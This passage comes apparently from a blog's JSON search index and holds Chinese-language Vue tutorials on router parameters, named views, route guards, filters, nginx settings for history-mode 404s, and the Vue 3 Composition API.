传递参数this.$router.push(&#123;path:&quot;name?a=123&quot;&#125;)// 或者this.$router.push(&#123;path:&quot;name&quot;,query:&#123;a:123&#125;&#125;)// 方式四 this.$router.go(1) //$router其实就是对history的封装\n\n\n如何拿到传递过来的参数\n\nthis.$router.push(&quot;/cart?goodsId=123&quot;)&lt;!--如何在页面上拿到goodsId--&gt;&lt;span&gt;&#123;&#123;$.route.query.goodsId&#125;&#125;&lt;/span&gt;\n\n\n$route.params是组件跟组件之间路由切换的时候，参数传递\n\n2.5 命名路由\n有时我们通过一个名称来标识一个路由显得更方便一些，特别是在链接一个路由，或者是执行一些跳转的时候。你可以在创建 Router 实例的时候，在 routes 配置中给某个路由设置名称\n\n\n\n给路由定义不同的名字，根据名字进行匹配\n给不同的router-view定义名字，通过名字进行对应组件渲染\n\n\nnew Router(&#123;    mode: &quot;history&quot;,    routes: [        &#123;            path:&quot;/cart/:cartId&quot;,             name: &quot;cart&quot;,            component:GoodsList,        &#125;    ]&#125;)\n\n\n之前的跳转方式\n\n&lt;router-link to=&quot;/cart&quot;&gt;&lt;/router-link&gt;\n\n\n根据路由名字跳转。以下是一个命名的路由，而且还带了参数\n\n&lt;router-link v-bind:to=&quot;&#123;&#123;name:&#x27;cart&#x27;,params:&#123;cartId:123&#125;&#125;&#125;&quot;&gt;&lt;/router-link&gt;&lt;!--params是路由的参数，并不是页面之间跳转的参数--&gt;\n\n2.6 命名视图\n有时候想同时（同级）展示多个视图，而不是嵌套展示，例如创建一个布局，有 ·sidebar·（侧导航） 和main（主内容） 两个视图，这个时候命名视图就派上用场了。你可以在界面中拥有多个单独命名的视图，而不是只有一个单独的出口。如果 router-view 没有设置名字，那么默认为 default\n\n\n实现一个命名的视图（很少用到）\n给router-view加name值\n\n\n\n&lt;router-view&gt;&lt;/router-view&gt;&lt;router-view name=&quot;title&quot;&gt;&lt;/router-view&gt;&lt;router-view name=&quot;image&quot;&gt;&lt;/router-view&gt;\n\n\n页面一进来就加载三个router-view。实现方法\n\nnew Router(&#123;    mode: &quot;history&quot;,    routes: [        &#123;            path:&quot;/&quot;,             name: &quot;cart&quot;,            // 根据不同的name值去加载对应的router-view,映射到对应的组件            components:&#123;                default:GoodsList,                title:Title,                img:Image            &#125;,            path:&quot;/cart/:cartId&quot;,             name: &quot;cart&quot;,            component:Cart        &#125;    ]&#125;)&lt;router-view&gt;&lt;/router-view&gt;&lt;router-view&gt;&lt;/router-view&gt;\n\n\n当我们的视图如上时,我们会发现每一个路由被渲染了两次,所以我们需要为视图命名\n\n&lt;router-view name=&quot;a&quot;&gt;&lt;/router-view&gt;&lt;router-view name=&quot;b&quot;&gt;&lt;/router-view&gt;​```    ​```javascriptvar Foo = &#123; template: &#x27;&lt;div&gt;foo&lt;/div&gt;&#x27; &#125;var Bar = &#123; template: &#x27;&lt;div&gt;bar&lt;/div&gt;&#x27; &#125;var routes = [        &#123;            path:&quot;/one&quot;,            name:&quot;one&quot;,            components:&#123;                a:Foo,                b:Bar            &#125;        &#125;,    ]\n\n2.7 重定向和别名重定向\n\n重定向(Redirect)就是通过各种方法将各种网络请求重新定个方向转到其它位置,用于网站调整或网页被移到一个新地址,它也是通过 routes 配置来完成，下面例子是从 /a 重定向到 /b\n\nvar router = new VueRouter(&#123;  routes: [    &#123; path: &#x27;/a&#x27;, redirect: &#x27;/b&#x27; &#125;  ]&#125;)\n\n别名\n\n/a` 的别名是 `/b`，意味着，当用户访问`/b` 时，`URL` 会保持为 `/b`，但是路由匹配则为 `/a`，就像用户访问`/a` 一样。简单的说就是给 /a 起了一个外号叫做 `/b` ,但是本质上还是 `/a\n\nvar router = new VueRouter(&#123;  routes: [    &#123; path: &#x27;/a&#x27;, component: A, alias: &#x27;/b&#x27; &#125;  ]&#125;)\n\n2.8 列表进入详情页传参\n例如商品列表页面前往商品详情页面，需要传一个商品id\n\n&lt;router-link :to=&quot;&#123;path: &#x27;detail&#x27;, query: &#123;id: 1&#125;&#125;&quot;&gt;前往detail页面&lt;/router-link&gt;\n\n\nc`页面的路径为`http://localhost:8080/#/detail?id=1`，可以看到传了一个参数`id=1`，并且就算刷新页面id也还会存在。此时在c页面可以通过id来获取对应的详情数据，获取`id`的方式是`this.$route.query.id\n\nvue传参方式有：query、params+动态路由传参\n\nquery通过path切换路由，params通过name切换路由\n\n// query通过path切换路由&lt;router-link :to=&quot;&#123;path: &#x27;Detail&#x27;, query: &#123; id: 1 &#125;&#125;&quot;&gt;前往Detail页面&lt;/router-link&gt;// params通过name切换路由&lt;router-link :to=&quot;&#123;name: &#x27;Detail&#x27;, params: &#123; id: 1 &#125;&#125;&quot;&gt;前往Detail页面&lt;/router-link&gt;\n\n\nquery通过this.$route.query来接收参数，params通过this.$route.params来接收参数\n\n// query通过this.$route.query接收参数created () &#123;    const id = this.$route.query.id;&#125;// params通过this.$route.params来接收参数created () &#123;    const id = this.$route.params.id;&#125;\n\n\nquery传参的url展现方式：/detail?id=1&amp;user=123&amp;identity=1&amp;更多参数\nparams＋动态路由的url方式：/detail/123\nparams动态路由传参，一定要在路由中定义参数，然后在路由跳转的时候必须要加上参数，否则就是空白页面\n\n&#123;          path: &#x27;/detail/:id&#x27;,          name: &#x27;Detail&#x27;,          component: Detail    &#125;,\n\n\n注意，params传参时，如果没有在路由中定义参数，也是可以传过去的，同时也能接收到，但是一旦刷新页面，这个参数就不存在了。这对于需要依赖参数进行某些操作的行为是行不通的\n\n// 定义的路由中，只定义一个id参数&#123;    path: &#x27;detail/:id&#x27;,    name: &#x27;Detail&#x27;,    components: Detail&#125;// template中的路由传参，// 传了一个id参数和一个token参数// id是在路由中已经定义的参数，而token没有定义&lt;router-link :to=&quot;&#123;name: &#x27;Detail&#x27;, params: &#123; id: 1, token: &#x27;123456&#x27; &#125;&#125;&quot;&gt;前往Detail页面&lt;/router-link&gt;// 在详情页接收created () &#123;    // 以下都可以正常获取到    // 但是页面刷新后，id依然可以获取，而token此时就不存在了    const id = this.$route.params.id;    const token = this.$route.params.token;&#125;","categories":["框架"],"tags":["vue"]},{"title":"vue-路由守卫","url":"/2018/08/07/Vue/vue-%E8%B7%AF%E7%94%B1%E5%AE%88%E5%8D%AB/","content":"Vue-router路由守卫 ( v4.x )对比之前版本，需要使用next的地方，现在默认返回undefined，不需调用next就可进入下一个路由。避免了未正确使用next而导致的一些错误 ( 比如：未调用next )。\n\n全局前置守卫router.beforeEach([to][, from][, next])\n\nrouter.beforeEach((to, from, next) =&gt; &#123;  // ...  /* 1. 取消导航 */  return false;  /* 2. 进入下一个路由守卫 */  return true;  return undefined;  /* 3. 跳转至其他路由地址 */  return [url];  // next 不做赘述&#125;)\n\n\n\n\n全局解析守卫router.beforeResolve([to][, from][, next]) ( 同全局前置守卫 )\n\n全局后置守卫router.afterEach([to][, from][, failure])\n\n路由独享守卫beforeEnter([to][, from][, next]) ( query &#x2F; params &#x2F; hash 改变时不会触发 )\n\n\nconst routes = [  &#123;    path: &#x27;/demo1&#x27;,    component: Demo1,    beforeEnter: (to, from) =&gt; &#123;      return false; // 取消导航    &#125;  &#125;,  &#123;    path: &#x27;/demo2&#x27;,    component: Demo2,    beforeEnter: [fnc1, fnc2] // 接收一个函数数组  &#125;]\n\n\n\n\n组件前置路由守卫beforeRouteEnter ( 在vm实例创建之前调用， 可通过next传入一个回调函数，默认参数是vm实例 )\n\nconst ComponentOptions = &#123;  beforeRouteEnter(to, from, next) &#123;    next(vm =&gt; &#123;&#125;);  &#125;&#125;\n\n\n组件路由更新守卫 beforeRouteUpdate ( 重用组件时调用 )\n\n  const ComponentOptions = &#123;  beforeRouteUpdate(to, from) &#123;    // ...  &#125;&#125;\n\n\n\n\n组件后置路由守卫beforeRouteLeave([to][, from][, next]) ( 重用组件时调用 )\n const ComponentOptions &#x3D; {   beforeRouteLeave(to, from) { &#x2F;&#x2F; … &#x2F;* 取消导航 *&#x2F; return false\n\n调用顺序进入组件beforeEach-&gt; beforeRouterEnter-&gt; beforeResolve-&gt; afterEach-&gt; beforeCreate ( 组件lifecycle )\n\n\n离开组件beforeRouterLeave-&gt; beforeEach-&gt; beforeResolve-&gt; afterEach-&gt; beforeDestory ( 组件lifecycle )\n","categories":["框架"],"tags":["vue"]},{"title":"vue-过滤器","url":"/2018/07/25/Vue/vue-%E8%BF%87%E6%BB%A4%E5%99%A8/","content":"一、是什么过滤器（filter）是输送介质管道上不可缺少的一种装置\n大白话，就是把一些不必要的东西过滤掉\n过滤器实质不改变原始数据，只是对数据进行加工处理后返回过滤后的数据再进行调用处理，我们也可以理解其为一个纯函数\nVue 允许你自定义过滤器，可被用于一些常见的文本格式化\nps: Vue3中已废弃filter\n二、如何用vue中的过滤器可以用在两个地方：双花括号插值和 v-bind 表达式，过滤器应该被添加在 JavaScript表达式的尾部，由“管道”符号指示：\n&lt;!-- 在双花括号中 --&gt;&#123;&#123; message | capitalize &#125;&#125;&lt;!-- 在 `v-bind` 中 --&gt;&lt;div v-bind:id=&quot;rawId | formatId&quot;&gt;&lt;/div&gt;\n\n定义filter在组件的选项中定义本地的过滤器\nfilters: &#123;  capitalize: function (value) &#123;    if (!value) return &#x27;&#x27;    value = value.toString()    return value.charAt(0).toUpperCase() + value.slice(1)  &#125;&#125;\n\n定义全局过滤器：\nVue.filter(&#x27;capitalize&#x27;, function (value) &#123;  if (!value) return &#x27;&#x27;  value = value.toString()  return value.charAt(0).toUpperCase() + value.slice(1)&#125;)new Vue(&#123;  // ...&#125;)\n\n注意：当全局过滤器和局部过滤器重名时，会采用局部过滤器\n过滤器函数总接收表达式的值 (之前的操作链的结果) 作为第一个参数。在上述例子中，capitalize 过滤器函数将会收到 message 的值作为第一个参数\n过滤器可以串联：\n&#123;&#123; message | filterA | filterB &#125;&#125;\n\n在这个例子中，filterA 被定义为接收单个参数的过滤器函数，表达式 message 的值将作为参数传入到函数中。然后继续调用同样被定义为接收单个参数的过滤器函数 filterB，将 filterA 的结果传递到 filterB 中。\n过滤器是 JavaScript函数，因此可以接收参数：\n&#123;&#123; message | filterA(&#x27;arg1&#x27;, arg2) &#125;&#125;\n\n这里，filterA 被定义为接收三个参数的过滤器函数。\n其中 message 的值作为第一个参数，普通字符串 &#39;arg1&#39; 作为第二个参数，表达式 arg2 的值作为第三个参数\n举个例子：\n&lt;div id=&quot;app&quot;&gt;    &lt;p&gt;&#123;&#123; msg | msgFormat(&#x27;疯狂&#x27;,&#x27;--&#x27;)&#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script&gt;    // 定义一个 Vue 全局的过滤器，名字叫做  msgFormat    Vue.filter(&#x27;msgFormat&#x27;, function(msg, arg, arg2) &#123;        // 字符串的  replace 方法，第一个参数，除了可写一个 字符串之外，还可以定义一个正则        return msg.replace(/单纯/g, arg+arg2)    &#125;)&lt;/script&gt;\n\n小结：\n部过滤器优先于全局过滤器被调用\n一个表达式可以使用多个过滤器。过滤器之间需要用管道符“|”隔开。其执行顺序从左往右\n\n三、应用场景平时开发中，需要用到过滤器的地方有很多，比如单位转换、数字打点、文本格式化、时间格式化之类的等\n比如我们要实现将30000 &#x3D;&gt; 30,000，这时候我们就需要使用过滤器\nVue.filter(&#x27;toThousandFilter&#x27;, function (value) &#123;     if (!value) return &#x27;&#x27;     value = value.toString()     return .replace(str.indexOf(&#x27;.&#x27;) &gt; -1 ? /(\\d)(?=(\\d&#123;3&#125;)+\\.)/g : /(\\d)(?=(?:\\d&#123;3&#125;)+$)/g, &#x27;$1,&#x27;)&#125;)\n\n四、原理分析使用过滤器\n&#123;&#123; message | capitalize &#125;&#125;\n\n在模板编译阶段过滤器表达式将会被编译为过滤器函数，主要是用过parseFilters，我们放到最后讲\n_s(_f(&#x27;filterFormat&#x27;)(message))\n\n首先分析一下_f：\n_f 函数全名是：resolveFilter，这个函数的作用是从this.$options.filters中找出注册的过滤器并返回\n// 变为this.$options.filters[&#x27;filterFormat&#x27;](message) // message为参数\n\n关于resolveFilter\nimport &#123; indentity,resolveAsset &#125; from &#x27;core/util/index&#x27; export function resolveFilter(id)&#123;    return resolveAsset(this.$options,&#x27;filters&#x27;,id,true) || identity&#125;\n\n内部直接调用resolveAsset，将option对象，类型，过滤器id，以及一个触发警告的标志作为参数传递，如果找到，则返回过滤器；\nresolveAsset的代码如下：\nexport function resolveAsset(options,type,id,warnMissing)&#123; // 因为我们找的是过滤器，所以在 resolveFilter函数中调用时 type 的值直接给的 &#x27;filters&#x27;,实际这个函数还可以拿到其他很多东西    if(typeof id !== &#x27;string&#x27;)&#123; // 判断传递的过滤器id 是不是字符串，不是则直接返回        return     &#125;    const assets = options[type]  // 将我们注册的所有过滤器保存在变量中    // 接下来的逻辑便是判断id是否在assets中存在，即进行匹配    if(hasOwn(assets,id)) return assets[id] // 如找到，直接返回过滤器    // 没有找到，代码继续执行    const camelizedId  = camelize(id) // 万一你是驼峰的呢    if(hasOwn(assets,camelizedId)) return assets[camelizedId]    // 没找到，继续执行    const PascalCaseId = capitalize(camelizedId) // 万一你是首字母大写的驼峰呢    if(hasOwn(assets,PascalCaseId)) return assets[PascalCaseId]    // 如果还是没找到，则检查原型链(即访问属性)    const result = assets[id] || assets[camelizedId] || assets[PascalCaseId]    // 如果依然没找到，则在非生产环境的控制台打印警告    if(process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; warnMissing &amp;&amp; !result)&#123;        warn(&#x27;Failed to resolve &#x27; + type.slice(0,-1) + &#x27;: &#x27; + id, options)    &#125;    // 无论是否找到，都返回查找结果    return result&#125;\n\n下面再来分析一下_s：\n_s 函数的全称是 toString,过滤器处理后的结果会当作参数传递给 toString函数，最终 toString函数执行后的结果会保存到Vnode中的text属性中，渲染到视图中\nfunction toString(value)&#123;    return value == null    ? &#x27;&#x27;    : typeof value === &#x27;object&#x27;      ? JSON.stringify(value,null,2)// JSON.stringify()第三个参数可用来控制字符串里面的间距      : String(value)&#125;\n\n最后，在分析下parseFilters，在模板编译阶段使用该函数阶段将模板过滤器解析为过滤器函数调用表达式\nfunction parseFilters (filter) &#123;    let filters = filter.split(&#x27;|&#x27;)    let expression = filters.shift().trim() // shift()删除数组第一个元素并将其返回，该方法会更改原数组    let i    if (filters) &#123;        for(i = 0;i &lt; filters.length;i++)&#123;            experssion = warpFilter(expression,filters[i].trim()) // 这里传进去的expression实际上是管道符号前面的字符串，即过滤器的第一个参数        &#125;    &#125;    return expression&#125;// warpFilter函数实现function warpFilter(exp,filter)&#123;    // 首先判断过滤器是否有其他参数    const i = filter.indexof(&#x27;(&#x27;)    if(i&lt;0)&#123; // 不含其他参数，直接进行过滤器表达式字符串的拼接        return `_f(&quot;$&#123;filter&#125;&quot;)($&#123;exp&#125;)`    &#125;else&#123;        const name = filter.slice(0,i) // 过滤器名称        const args = filter.slice(i+1) // 参数，但还多了 ‘)’        return `_f(&#x27;$&#123;name&#125;&#x27;)($&#123;exp&#125;,$&#123;args&#125;` // 注意这一步少给了一个 &#x27;)&#x27;    &#125;&#125;\n\n小结：\n在编译阶段通过parseFilters将过滤器编译成函数调用（串联过滤器则是一个嵌套的函数调用，前一个过滤器执行的结果是后一个过滤器函数的参数）\n编译后通过调用resolveFilter函数找到对应过滤器并返回结果\n执行结果作为参数传递给toString函数，而toString执行后，其结果会保存在Vnode的text属性中，渲染到视图\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue-部署404问题","url":"/2018/07/23/Vue/vue-%E9%83%A8%E7%BD%B2404%E9%97%AE%E9%A2%98/","content":"一、如何部署前后端分离开发模式下，前后端是独立布署的，前端只需要将最后的构建物上传至目标服务器的web容器指定的静态目录下即可\n我们知道vue项目在构建后，是生成一系列的静态文件\n\n常规布署我们只需要将这个目录上传至目标服务器即可\n// scp 上传 user为主机登录用户，host为主机外网ip, xx为web容器静态资源路径scp dist.zip user@host:/xx/xx/xx\n\n让web容器跑起来，以nginx为例\nserver &#123;  listen  80;  server_name  www.xxx.com;  location / &#123;    index  /data/dist/index.html;  &#125;&#125;\n\n配置完成记得重启nginx\n// 检查配置是否正确nginx -t // 平滑重启nginx -s reload\n\n操作完后就可以在浏览器输入域名进行访问了\n当然上面只是提到最简单也是最直接的一种布署方式\n什么自动化，镜像，容器，流水线布署，本质也是将这套逻辑抽象，隔离，用程序来代替重复性的劳动，本文不展开\n二、404问题这是一个经典的问题，相信很多同学都有遇到过，那么你知道其真正的原因吗？\n我们先还原一下场景：\n\nvue项目在本地时运行正常，但部署到服务器中，刷新页面，出现了404错误\n\n先定位一下，HTTP 404 错误意味着链接指向的资源不存在\n问题在于为什么不存在？且为什么只有history模式下会出现这个问题？\n为什么history模式下有问题Vue是属于单页应用（single-page application）\n而SPA是一种网络应用程序或网站的模型，所有用户交互是通过动态重写当前页面，前面我们也看到了，不管我们应用有多少页面，构建物都只会产出一个index.html\n现在，我们回头来看一下我们的nginx配置\nserver &#123;  listen  80;  server_name  www.xxx.com;  location / &#123;    index  /data/dist/index.html;  &#125;&#125;\n\n可以根据 nginx 配置得出，当我们在地址栏输入 www.xxx.com 时，这时会打开我们 dist 目录下的 index.html 文件，然后我们在跳转路由进入到 www.xxx.com/login\n关键在这里，当我们在 website.com/login 页执行刷新操作，nginx location 是没有相关配置的，所以就会出现 404 的情况\n为什么hash模式下没有问题router hash` 模式我们都知道是用符号#表示的，如 `website.com/#/login`, `hash` 的值为 `#/login\n\n它的特点在于：hash 虽然出现在 URL 中，但不会被包括在 HTTP 请求中，对服务端完全没有影响，因此改变 hash 不会重新加载页面\nhash 模式下，仅 hash 符号之前的内容会被包含在请求中，如 website.com/#/login 只有 website.com 会被包含在请求中 ，因此对于服务端来说，即使没有配置location，也不会返回404错误\n解决方案看到这里我相信大部分同学都能想到怎么解决问题了，\n产生问题的本质是因为我们的路由是通过JS来执行视图切换的，\n当我们进入到子路由时刷新页面，web容器没有相对应的页面此时会出现404\n所以我们只需要配置将任意页面都重定向到 index.html，把路由交由前端处理\n对nginx配置文件.conf修改，添加try_files $uri $uri/ /index.html;\nserver &#123;  listen  80;  server_name  www.xxx.com;  location / &#123;    index  /data/dist/index.html;    try_files $uri $uri/ /index.html;  &#125;&#125;\n\n修改完配置文件后记得配置的更新\nnginx -s reload\n\n这么做以后，你的服务器就不再返回 404 错误页面，因为对于所有路径都会返回 index.html 文件\n为了避免这种情况，你应该在 Vue 应用里面覆盖所有的路由情况，然后在给出一个 404 页面\nconst router = new VueRouter(&#123;  mode: &#x27;history&#x27;,  routes: [    &#123; path: &#x27;*&#x27;, component: NotFoundComponent &#125;  ]&#125;)\n\n关于后端配置方案还有：Apache、nodejs等.\n","categories":["框架"],"tags":["vue"]},{"title":"vue3-Composition API详解","url":"/2021/09/14/Vue/vue3-Composition%20API%E8%AF%A6%E8%A7%A3/","content":"Composition API也叫组合式API，是Vue3.x的新特性。\n\n通过创建 Vue 组件，我们可以将接口的可重复部分及其功能提取到可重用的代码段中。仅此一项就可以使我们的应用程序在可维护性和灵活性方面走得更远。然而，我们的经验已经证明，光靠这一点可能是不够的，尤其是当你的应用程序变得非常大的时候——想想几百个组件。在处理如此大的应用程序时，共享和重用代码变得尤为重要\n\n通俗的讲：\n没有Composition API之前vue相关业务的代码需要配置到option的特定的区域，中小型项目是没有问题的，但是在大型项目中会导致后期的维护性比较复杂，同时代码可复用性不高。Vue3.x中的composition-api就是为了解决这个问题而生的\ncompositon api提供了以下几个函数：\n\nsetup\nref\nreactive\nwatchEffect\nwatch\ncomputed\ntoRefs\n生命周期的hooks\n\n一、setup组件选项\n新的 setup 组件选项在创建组件之前执行，一旦 props 被解析，并充当合成 API 的入口点\n\n提示：\n\n由于在执行 setup 时尚未创建组件实例，因此在 setup 选项中没有 this。这意味着，除了props之外，你将无法访问组件中声明的任何属性——本地状态、计算属性或方法。\n\n使用 setup 函数时，它将接受两个参数：\n\nprops\ncontext\n\n让我们更深入地研究如何使用每个参数\n1. Props\nsetup 函数中的第一个参数是 props。正如在一个标准组件中所期望的那样，setup 函数中的 props 是响应式的，当传入新的 prop 时，它将被更新\n\n// MyBook.vueexport default &#123;  props: &#123;    title: String  &#125;,  setup(props) &#123;    console.log(props.title)  &#125;&#125;\n\n注意：\n\n但是，因为 props 是响应式的，你不能使用 ES6 解构，因为它会消除 prop 的响应性。\n\n如果需要解构 prop，可以通过使用 setup 函数中的 toRefs 来安全地完成此操作。\n// MyBook.vueimport &#123; toRefs &#125; from &#x27;vue&#x27;setup(props) &#123;\tconst &#123; title &#125; = toRefs(props)\tconsole.log(title.value)&#125;\n\n2. 上下文\n传递给 setup 函数的第二个参数是 context。context 是一个普通的 JavaScript 对象，它暴露三个组件的 property\n\n// MyBook.vueexport default &#123;  setup(props, context) &#123;    // Attribute (非响应式对象)    console.log(context.attrs)    // 插槽 (非响应式对象)    console.log(context.slots)    // 触发事件 (方法)    console.log(context.emit)  &#125;&#125;\n\n\ncontext 是一个普通的 JavaScript 对象，也就是说，它不是响应式的，这意味着你可以安全地对 context 使用 ES6 解构\n\n// MyBook.vueexport default &#123;  setup(props, &#123; attrs, slots, emit &#125;) &#123;    ...  &#125;&#125;\n\n\nattrs 和 slots 是有状态的对象，它们总是会随组件本身的更新而更新。这意味着你应该避免对它们进行解构，并始终以 attrs.x 或 slots.x 的方式引用 property。请注意，与 props 不同，attrs 和 slots 是非响应式的。如果你打算根据 attrs 或 slots 更改应用副作用，那么应该在 onUpdated生命周期钩子中执行此操作。\n\n3. setup组件的 property\n执行 setup 时，组件实例尚未被创建。因此，你只能访问以下 property：\n\n\nprops\nattrs\nslots\nemit\n\n换句话说，你将无法访问以下组件选项：\n\ndata\ncomputed\nmethods\n\n4. ref reactive 以及setup结合模板使用在看setup结合模板使用之前，我们首先得知道ref 和 reactive 方法。\n如果 setup 返回一个对象则可以在模板中绑定对象中的属性和方法，但是要定义响应式数据的时候可以使用ref, reactive方法定义响应式的数据\n错误写法：&lt;template&gt;&#123;&#123;msg&#125;&#125;&lt;br&gt;&lt;button @click=&quot;updateMsg&quot;&gt;改变etup中的msg&lt;/button&gt;&lt;br&gt;&lt;/template&gt;&lt;script&gt;export default &#123;    data() &#123;        return &#123;        &#125;    &#125;,    setup() &#123;        let msg = &quot;这是setup中的msg&quot;;        let updateMsg = () =&gt; &#123;            alert(&quot;触发方法&quot;)            msg = &quot;改变后的值&quot;        &#125;        return &#123;            msg,            updateMsg        &#125;    &#125;,&#125;&lt;/script&gt;&lt;style lang=&quot;scss&quot;&gt;.home &#123;    position: relative;&#125;&lt;/style&gt;\n\n正确写法一：\nref用来定义响应式的 字符串、 数值、 数组、Bool类型\n\nimport &#123;      ref&#125; from &#x27;vue&#x27;&lt;template&gt;&#123;&#123;msg&#125;&#125;&lt;br&gt;&lt;br&gt;&lt;button @click=&quot;updateMsg&quot;&gt;改变etup中的msg&lt;/button&gt;&lt;br&gt;&lt;br&gt;&lt;ul&gt;    &lt;li v-for=&quot;(item,index) in list&quot; :key=&quot;index&quot;&gt;        &#123;&#123;item&#125;&#125;    &lt;/li&gt;&lt;/ul&gt;&lt;br&gt;&lt;/template&gt;&lt;script&gt;import &#123;    ref&#125; from &#x27;vue&#x27;export default &#123;    data() &#123;        return &#123;        &#125;    &#125;,    setup() &#123;        let msg = ref(&quot;这是setup中的msg&quot;);        let list = ref([&quot;马总&quot;, &quot;李总&quot;, &quot;刘总&quot;])        let updateMsg = () =&gt; &#123;            alert(&quot;触发方法&quot;);            msg.value = &quot;改变后的值&quot;        &#125;        return &#123;            msg,            list,            updateMsg        &#125;    &#125;,&#125;&lt;/script&gt;&lt;style lang=&quot;scss&quot;&gt;.home &#123;    position: relative;&#125;&lt;/style&gt;\n\n正确写法二：reactive 用来定义响应式的对象\nimport &#123;    reactive   &#125; from &#x27;vue&#x27;&lt;template&gt;&#123;&#123;msg&#125;&#125;&lt;br&gt;&lt;br&gt;&lt;button @click=&quot;updateMsg&quot;&gt;改变setup中的msg&lt;/button&gt;&lt;br&gt;&lt;br&gt;&lt;ul&gt;    &lt;li v-for=&quot;(item,index) in list&quot; :key=&quot;index&quot;&gt;        &#123;&#123;item&#125;&#125;    &lt;/li&gt;&lt;/ul&gt;&lt;br&gt;&#123;&#123;setupData.title&#125;&#125;&lt;br&gt;&lt;button @click=&quot;updateTitle&quot;&gt;更新setup中的title&lt;/button&gt;&lt;br&gt;&lt;br&gt;&lt;/template&gt;&lt;script&gt;import &#123;    reactive,    ref&#125; from &#x27;vue&#x27;export default &#123;    data() &#123;        return &#123;        &#125;    &#125;,    setup() &#123;        let msg = ref(&quot;这是setup中的msg&quot;);        let setupData = reactive(&#123;            title: &quot;reactive定义响应式数据的title&quot;,            userinfo: &#123;                username: &quot;张三&quot;,                age: 20            &#125;        &#125;)        let updateMsg = () =&gt; &#123;            alert(&quot;触发方法&quot;);            msg.value = &quot;改变后的值&quot;        &#125;        let updateTitle = () =&gt; &#123;            alert(&quot;触发方法&quot;);            setupData.title = &quot;我是改变后的title&quot;        &#125;        return &#123;            msg,            setupData,            updateMsg,            updateTitle        &#125;    &#125;,&#125;&lt;/script&gt;&lt;style lang=&quot;scss&quot;&gt;.home &#123;    position: relative;&#125;&lt;/style&gt;\n\n**说明:**要改变ref定义的属性名称需要通过 属性名称.value来修改，要改变reactive中定义的对象名称可以直接\n5. 使用 this\n在 setup() 内部，this 不会是该活跃实例的引用，因为 setup() 是在解析其它组件选项之前被调用的，所以 setup() 内部的 this 的行为与其它选项中的 this 完全不同。这在和其它选项式 API 一起使用 setup() 时可能会导致混淆\n\n二、toRefs - 解构响应式对象数据\n把一个响应式对象转换成普通对象，该普通对象的每个 property 都是一个 ref ，和响应式对象 property 一一对应\n\n&lt;template&gt;&lt;div&gt;    &lt;h1&gt;解构响应式对象数据&lt;/h1&gt;    &lt;p&gt;Username: &#123;&#123;username&#125;&#125;&lt;/p&gt;    &lt;p&gt;Age: &#123;&#123;age&#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123;    reactive,    toRefs&#125; from &quot;vue&quot;;export default &#123;    name: &quot;解构响应式对象数据&quot;,    setup() &#123;        const user = reactive(&#123;            username: &quot;张三&quot;,            age: 10000,        &#125;);        return &#123;            ...toRefs(user)        &#125;;    &#125;,&#125;;&lt;/script&gt;\n\n\n当想要从一个组合逻辑函数中返回响应式对象时，用 toRefs 是很有效的，该 API 让消费组件可以 解构 &#x2F; 扩展（使用 …操作符）返回的对象，并不会丢失响应性：\n\nfunction useFeatureX() &#123;  const state = reactive(&#123;    foo: 1,    bar: 2,  &#125;)  // 对 state 的逻辑操作  // ....  // 返回时将属性都转为 ref  return toRefs(state)&#125;export default &#123;  setup() &#123;    // 可以解构，不会丢失响应性    const &#123; foo, bar &#125; = useFeatureX()    return &#123;      foo,      bar,    &#125;  &#125;,&#125;\n\n三、computed - 计算属性&lt;template&gt;&lt;div&gt;    &lt;h1&gt;解构响应式对象数据+computed&lt;/h1&gt;    &lt;input type=&quot;text&quot; v-model=&quot;firstName&quot; placeholder=&quot;firstName&quot; /&gt;    &lt;br&gt;    &lt;br&gt;    &lt;input type=&quot;text&quot; v-model=&quot;lastName&quot; placeholder=&quot;lastName&quot; /&gt;    &lt;br&gt;    &#123;&#123;fullName&#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123;    reactive,    toRefs,    computed&#125; from &quot;vue&quot;;export default &#123;    name: &quot;解构响应式对象数据&quot;,    setup() &#123;        const user = reactive(&#123;            firstName: &quot;&quot;,            lastName: &quot;&quot;,        &#125;);        const fullName = computed(() =&gt; &#123;            return user.firstName + &quot; &quot; + user.lastName        &#125;)        return &#123;            ...toRefs(user),            fullName        &#125;;    &#125;,&#125;;&lt;/script&gt;\n\n四、readonly “深层”的只读代理\n传入一个对象（响应式或普通）或 ref，返回一个原始对象的只读代理。一个只读的代理是“深层的”，对象内部任何嵌套的属性也都是只读的\n\n&lt;template&gt;  &lt;div&gt;    &lt;h1&gt;readonly - “深层”的只读代理&lt;/h1&gt;    &lt;p&gt;original.count: &#123;&#123;original.count&#125;&#125;&lt;/p&gt;    &lt;p&gt;copy.count: &#123;&#123;copy.count&#125;&#125;&lt;/p&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; reactive, readonly &#125; from &quot;vue&quot;;export default &#123;  name: &quot;Readonly&quot;,  setup() &#123;    const original = reactive(&#123; count: 0 &#125;);    const copy = readonly(original);    setInterval(() =&gt; &#123;      original.count++;      copy.count++; // 报警告，Set operation on key &quot;count&quot; failed: target is readonly. Proxy &#123;count: 1&#125;    &#125;, 1000);    return &#123; original, copy &#125;;  &#125;,&#125;;&lt;/script&gt;\n\n五、watchEffect\n在响应式地跟踪其依赖项时立即运行一个函数，并在更改依赖项时重新运行它。\n\n&lt;template&gt;&lt;div&gt;    &lt;h1&gt;watchEffect - 侦听器&lt;/h1&gt;    &lt;p&gt;&#123;&#123;data.count&#125;&#125;&lt;/p&gt;    &lt;button @click=&quot;stop&quot;&gt;手动关闭侦听器&lt;/button&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123;    reactive,    watchEffect&#125; from &quot;vue&quot;;export default &#123;    name: &quot;WatchEffect&quot;,    setup() &#123;        const data = reactive(&#123;            count: 1,            num: 1        &#125;);        const stop = watchEffect(() =&gt; console.log(`侦听器：$&#123;data.count&#125;`));        setInterval(() =&gt; &#123;            data.count++;        &#125;, 1000);        return &#123;            data,            stop        &#125;;    &#125;,&#125;;&lt;/script&gt;\n\n六、watch 、watch 与watchEffect区别对比watchEffect，**watch允许我们**：\n\n懒执行，也就是说仅在侦听的源变更时才执行回调；\n更明确哪些状态的改变会触发侦听器重新运行；\n访问侦听状态变化前后的值\n\n更明确哪些状态的改变会触发侦听器重新运行\n&lt;template&gt;&lt;div&gt; 